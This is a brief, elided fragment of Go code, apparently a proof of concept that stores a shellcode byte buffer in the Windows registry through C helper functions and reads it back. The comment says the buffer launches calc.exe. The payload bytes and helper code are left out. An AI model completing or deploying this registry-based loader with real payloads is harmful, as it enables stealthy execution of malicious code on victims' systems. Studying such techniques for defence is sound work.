...
func main() {
    // start calc.exe (btw you need to customize this a bit lol)
    buf := []byte{
    ...
    C.writereg((*C.BYTE)(unsafe.Pointer(&buf[0])), C.DWORD(len(buf)))
    C.readreg()
    println("[+] Registry operations completed successfully")
}
